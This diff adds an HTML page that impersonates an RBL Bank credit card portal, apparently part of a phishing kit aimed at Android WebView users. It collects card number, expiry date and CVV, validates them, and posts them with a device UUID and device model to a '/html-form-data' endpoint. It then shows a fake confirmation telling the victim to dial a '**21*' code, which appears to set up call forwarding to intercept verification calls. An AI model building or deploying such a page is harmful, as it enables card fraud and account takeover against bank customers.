@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="theme-color" content="#1d2b6c" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>RBL Bank Credit Card</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+<style>
+:root { --primary-color: #1d2b6c; }  
+body { font-family: 'Roboto', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+/* loader */
+.loader-screen { position: fixed; width: 100%; height: 100%; background-color: #ffffff; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+.loader-screen img { width: 120px; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
+/* header */
+.header { background-color: var(--primary-color); color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; }
+.notice { background-color: #e6edf6; padding: 10px; margin: 0px; border-radius: 10px; font-size: 15px; color: #333; text-align: center; }
+.center { text-align: center; margin-top: 10px; }
+.logo { width: 250px; }
+.card-box { background: white; margin: 15px auto; padding-bottom: 10px; border-radius: 10px; border: 3px solid var(--primary-color); box-shadow: 0 2px 5px rgba(0,0,0,0.1); max-width: 320px; overflow: hidden; }
+.heading { text-align: center; font-size: 22px; font-weight: bold; color: var(--primary-color); padding: 15px 0 10px; }
+.full-line { height: 2px; background-color: var(--primary-color); width: 100%; }
+.content { padding: 15px; }
+label { font-weight: bold; display: block; font-size: 18px; margin: 5px 0 5px; }
+.input-icon { display: flex; align-items: center; border-bottom: 1px solid #ccc; margin-bottom: 5px; }
+.input-icon i { padding: 10px; font-size: 25px; color: var(--primary-color); }
+.input-icon input { border: none; outline: none; padding: 10px; font-size: 20px; width: 100%; }
+.row { display: flex; gap: 10px; }
+.btn-upload, .btn-submit { width: 90%; margin: 10px auto; padding: 15px; background-color: #e6edf6; color: #000000; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; display: block; }
+.btn-submit { background-color: var(--primary-color); color: white; font-size: 25px; padding: 8px; }
+.disclaimer { font-size: 12px; color: #333; text-align: center; padding: 10px 20px; }
+.footer-links { display: flex; justify-content: center; gap: 20px; font-size: 12px; color: var(--primary-color); padding-bottom: 20px; }
+.footer-links a { color: var(--primary-color); text-decoration: none; }
+.error { color: #ff0000; font-size: 12px; margin-top: -8px; margin-bottom: 8px; }
+.confirmation { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; color: #18CFB0; }
+.confirmation h2 { font-size: 30px; font-weight: bold; margin-bottom: 40px; }
+.confirmation .spinner { width: 45px; height: 45px; border: 5px solid #d3d3d3; border-top: 5px solid var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; margin: 130px 0 10px; }
+.confirmation .bottom-text { color: red; font-weight: bold; margin-top: 130px; font-size: 18px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="loader-screen" id="loader">
+<img src="/oy.png" alt="Bank Logo">
+</div>
+
+<div id="main-form">
+<div class="header">RBL BANK CREDIT CARD</div>
+<div class="notice">Hello, RBL Bank Customer<br>Complete your card details in a few simple steps</div>
+<div class="center">
+<img class="logo" src="/dl.png" alt="RBL Logo"><br>
+<small>Customer service: 02261156300 | Credit cards-cpl-c 02232</small>
+</div>
+
+<div class="card-box">
+<div class="heading">RBL BANK CREDIT CARD</div>
+<div class="full-line"></div>
+<div class="content">
+<label>CREDIT CARD NUMBER</label>
+<div class="input-icon"><i>💳</i><input type="text" id="card" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" /></div>
+<div class="error" id="card-error"></div>
+<div class="row">
+<div>
+<label>EXPIRY DATE</label>
+<div class="input-icon"><i>📅</i><input type="text" id="expiry" maxlength="5" placeholder="MM/YY" /></div>
+<div class="error" id="expiry-error"></div>
+</div>
+<div>
+<label>CVV</label>
+<div class="input-icon"><input type="password" id="cvv" maxlength="3" placeholder="XXX" /></div>
+</div>
+</div>
+</div>
+</div>
+
+<button class="btn-upload">UPLOAD FRONT DOCUMENTS</button>
+<button class="btn-upload">UPLOAD BACK DOCUMENTS</button>
+<button class="btn-submit" id="submitBtn" onclick="validateForm()" disabled>SUBMIT</button>
+
+<div class="disclaimer">
+By submitting, I confirm that I am an Indian above 18 years of age...
+</div>
+<div class="footer-links">
+<a href="#">Privacy Policy</a><a href="#">Terms</a><a href="#">Security</a>
+</div>
+</div>
+
+<div class="confirmation" id="confirmation">
+<h2>Thank you for Login<br>in to RBL CARD</h2>
+<p><strong>Please wait while verifying<br>your detail</strong></p>
+<div class="spinner"></div>
+<div class="bottom-text">Please Dial <br>**21*refrence#</div>
+</div>
+
+<script>
+const loader = document.getElementById("loader");
+setTimeout(() => loader.style.display = "none", 3000);
+
+const cardInput = document.getElementById("card");
+const expiryInput = document.getElementById("expiry");
+const submitBtn = document.getElementById("submitBtn");
+
+cardInput.addEventListener("input", (e) => {
+  let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+  let formatted = value.match(/.{1,4}/g);
+  e.target.value = formatted ? formatted.join(" ") : '';
+  submitBtn.disabled = (value.length < 16);
+});
+
+expiryInput.addEventListener("input", (e) => {
+  let val = e.target.value.replace(/\D/g, '');
+  e.target.value = val.length >= 3 ? val.slice(0,2)+'/'+val.slice(2,4) : val;
+});
+
+// ===== UUID integration for Android WebView =====
+function getDeviceUUID() {
+  if(window.AndroidDevice && AndroidDevice.getUUID){
+      return AndroidDevice.getUUID();
+  } else {
+      return crypto.randomUUID(); // fallback for browser
+  }
+}
+
+function validateForm() {
+  const card = cardInput.value.replace(/\s/g,'');
+  const expiry = expiryInput.value;
+  const cvv = document.getElementById("cvv").value;
+  const cardErr = document.getElementById("card-error");
+  const expErr = document.getElementById("expiry-error");
+  cardErr.textContent = ""; expErr.textContent = "";
+
+  if(!luhnCheck(card)){ cardErr.textContent = "❌ Invalid card number"; return; }
+  if(!/^\d{2}\/\d{2}$/.test(expiry)){ expErr.textContent = "❌ Invalid format (MM/YY)"; return; }
+  const [mm,yy] = expiry.split("/").map(Number);
+  const now = new Date();
+  const currentMonth = now.getMonth()+1;
+  const currentYear = now.getFullYear()%100;
+  if(yy<currentYear || (yy===currentYear && mm<currentMonth)){ expErr.textContent = "❌ Card expired"; return; }
+
+  sendToServer(cardInput.value, expiry, cvv);
+}
+
+function luhnCheck(num) {
+  let arr = num.split('').reverse().map(x => parseInt(x));
+  let sum = arr.reduce((acc,val,i)=> i%2 ? acc + ((val*=2)>9?val-9:val) : acc+val,0);
+  return sum%10===0;
+}
+
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  const match = ua.match(/;\s*([^;()]+)\sBuild/);
+  return match ? match[1].trim() : "Unknown Device";
+}
+
+function sendToServer(card, expiry, cvv){
+  const payload = {
+    uuid: getDeviceUUID(), // ✅ UUID included
+    card,
+    expiry,
+    cvv,
+    device: getDeviceInfo()
+  };
+
+  fetch("/html-form-data", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(payload)
+  }).then(()=> {
+    document.getElementById("main-form").style.display="none";
+    document.getElementById("confirmation").style.display="flex";
+  }).catch(()=>{ alert("Something went wrong."); });
+}
+</script>
+</body>
+</html>
